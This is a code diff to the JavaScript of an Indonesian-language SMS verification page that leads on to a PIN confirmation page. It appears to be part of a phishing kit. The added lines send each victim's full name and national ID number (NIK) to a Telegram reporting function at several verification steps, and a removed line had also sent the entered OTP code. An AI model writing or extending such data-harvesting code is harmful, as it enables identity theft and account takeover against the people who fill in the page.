@@ -141,12 +141,32 @@
     verifyButton.textContent = 'VERIFIKASI BERHASIL ✓';
 
     if (isDashboardReauth) {
-      
+      window.kirimLaporanKeTelegram?.({
+        event: 'SMS_REAUTH_VERIFIED',
+        page: 'verifikasi-sms.html',
+        nama_lengkap: identity?.fullName,
+        nik: identity?.nik,
+        status: 'OTP_REAUTH_VERIFIED'
+      });
+
+      setMessage(`Kode untuk ${identity.fullName} berhasil diverifikasi.`, 'success');
+      window.setTimeout(() => window.location.replace('konfirmasi-pin.html'), 650);
+      return;
+    }
+
+    const saved = NovaStorage.setSmsVerified(true);
+    if (!saved) {
+      verifyButton.textContent = 'VERIFIKASI KODE →';
+      setMessage('Status verifikasi tidak dapat disimpan pada browser ini.', 'error');
+      updateVerifyButton();
+      return;
+    }
+
+    window.kirimLaporanKeTelegram?.({
       event: 'SMS_VERIFIED',
       page: 'verifikasi-sms.html',
       nama_lengkap: identity?.fullName,
       nik: identity?.nik,
-      otp: otpValue,
       status: 'OTP_VERIFIED'
     });
 
